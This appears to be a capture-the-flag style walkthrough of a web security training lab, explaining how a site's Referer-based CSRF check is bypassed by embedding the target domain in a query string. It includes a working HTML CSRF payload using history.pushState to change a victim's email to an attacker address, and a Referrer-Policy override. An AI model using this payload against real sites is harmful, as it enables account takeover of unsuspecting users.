### ðŸ§ª Lab Summary

- The site attempts to block CSRF by validating the Referer header.
- It rejects requests with foreign domains in the Referer.
- But it **accepts any Referer** that contains the expected domain **anywhere** in the stringâ€”even in a query string.
- This allows attackers to spoof the Referer using `history.pushState()`.

---

### ðŸ”¥ Exploit Strategy

1. **Capture the legitimate email change request** using Burp Suite.
2. **Test Referer behavior**:
   - `Referer: https://evil.com` â†’ rejected.
   - `Referer: https://evil.com?YOUR-LAB-ID.web-security-academy.net` â†’ accepted.
3. **Craft CSRF exploit**:
   ```html
   <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
     <input type="hidden" name="email" value="attacker@evil.com">
   </form>
   <script>
     history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net");
     document.forms[0].submit();
   </script>
   ```
4. **Override browser stripping behavior** by setting:
   ```html
   <meta name="referrer" content="unsafe-url">
   ```
   Or in the exploit serverâ€™s header section:
   ```
   Referrer-Policy: unsafe-url
   ```

---

### ðŸ§  Symbolic Mapping

| Referer State | Symbolic Gate | Server Behavior |
|---------------|----------------|------------------|
| Foreign domain | False mirror | Request blocked |
| Embedded domain | Fragmented shard | Request accepted |
| No domain | Blind gate | Request rejected |
